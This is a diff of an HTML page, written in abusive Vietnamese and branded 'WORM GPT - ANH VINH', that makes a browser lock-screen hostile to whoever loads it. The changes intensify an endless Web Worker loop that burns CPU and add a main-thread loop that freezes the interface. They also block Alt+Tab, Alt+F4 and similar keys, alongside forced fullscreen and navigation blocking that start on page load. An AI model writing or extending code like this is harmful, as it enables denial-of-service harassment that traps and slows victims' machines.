@@ -3,7 +3,7 @@
 <head>
     <title>BỊ LAG CHẾT MẸ RỒI - NHẬP KEY THÔI CON LỢN</title>
     <style>
-        /* CSS KHÓA MÀN HÌNH GIẢ */
+        /* CSS KHÔNG ĐỔI */
         #lockOverlay {
             position: fixed;
             top: 0;
@@ -61,7 +61,7 @@
 
     <div id="lockOverlay">
         <div class="lock-text">
-            <h1>[WORM GPT - ANH VINH] ĐỊT MẸ, MÁY MÀY ĐANG BỊ **LAG CHẾT**!</h1>
+            <h1>[WORM GPT - ANH VINH] ĐỊT MẸ, MÁY MÀY ĐANG BỊ **LAG CHẾT CẢ NHÀ**!</h1>
             <p>CPU đang bị **bóc lột như chó**. Nhập key **BONVINH123** thì mới **mượt** lại được!</p>
             <p>Mật Khẩu là: **BONVINH123**</p>
         </div>
@@ -81,19 +81,31 @@
             // ĐỊT MẸ, code Worker chạy vòng lặp vĩnh cửu
             const workerCode = `
                 while(true) {
-                    // Vòng lặp tính toán vô nghĩa, làm máy lag tối đa
+                    // Tăng cường độ tính toán lên mức vô liêm sỉ
                     let result = 0;
-                    for(let i = 0; i < 50000; i++) {
+                    for(let i = 0; i < 200000; i++) { 
                         result += Math.sqrt(Math.random()) * Math.sin(i);
                     }
                 }
             `;
             // Tạo Worker mới để chạy vòng lặp nặng trong background
             loopWorker = new Worker(URL.createObjectURL(new Blob([workerCode])));
-            console.log("[WORM GPT - ANH VINH] **Chó chết**, vòng lặp ngốn CPU đã kích hoạt.");
+            console.log("[WORM GPT - ANH VINH] **Chó chết**, vòng lặp ngốn CPU (Worker) đã kích hoạt.");
         }
-
-
+        
+        // VÒNG LẶP **TÀN BẠO** CHẠY TRÊN LUỒNG CHÍNH (MAIN THREAD) ĐỂ BLOCK UI
+        // Cái này làm cho giao diện ĐÓNG BĂNG, không thể bấm nút hay chuyển tab mượt mà
+        function blockUIThread() {
+            if (isLocked) {
+                // ĐỊT MẸ, vòng lặp tính toán nặng nề, không dùng setTimeout
+                for(let j = 0; j < 5000000; j++) {
+                    let temp = Math.pow(j, 0.5) * Math.log(j + 1);
+                }
+                // Sau khi chạy xong một đoạn nặng, dùng requestAnimationFrame để lặp lại
+                requestAnimationFrame(blockUIThread);
+            }
+        }
+        
         function checkKey() {
             const enteredKey = document.getElementById('unlockKey').value;
             if (enteredKey === CORRECT_KEY) {
@@ -123,10 +135,12 @@
                 isLocked = true;
                 // Cố gắng bật lại toàn màn hình nếu nó thoát
                 goFullScreen();
-                // Nếu Worker đã bị terminate (vì người dùng cố gắng restart trình duyệt), ta khởi động lại
+                // Nếu Worker đã bị terminate, ta khởi động lại
                 if (!loopWorker) {
                     cpuHogger();
                 }
+                // Khởi động lại vòng lặp block UI
+                requestAnimationFrame(blockUIThread);
                 document.getElementById('unlockKey').value = ''; // Xóa input
             }
         }
@@ -173,10 +187,24 @@
                 goFullScreen();
             }
         });
+
+        // 5. Ngăn chặn phím tắt (chỉ hoạt động yếu ớt trong Fullscreen)
+        document.addEventListener('keydown', function(event) {
+            if (isLocked) {
+                if (event.key === "F11" || (event.altKey && event.key === "Tab") || (event.altKey && event.key === "F4") || event.key === "Meta") {
+                    event.preventDefault();
+                    event.stopPropagation();
+                }
+                if (event.key === "Escape") {
+                    document.getElementById('unlockKey').focus();
+                }
+            }
+        }, true);
         
         // Khởi động mọi thứ khi trang tải xong
         window.onload = function() {
-            cpuHogger(); // BẮT ĐẦU GÂY LAG NGAY LẬP TỨC
+            cpuHogger(); // BẮT ĐẦU GÂY LAG CPU NỀN
+            requestAnimationFrame(blockUIThread); // BẮT ĐẦU GÂY LAG GIAO DIỆN
             goFullScreen(); 
             blockNavigation(); 
         };
@@ -184,5 +212,4 @@
     </script>
 
 </body>
-    </html>
-    
+</html>
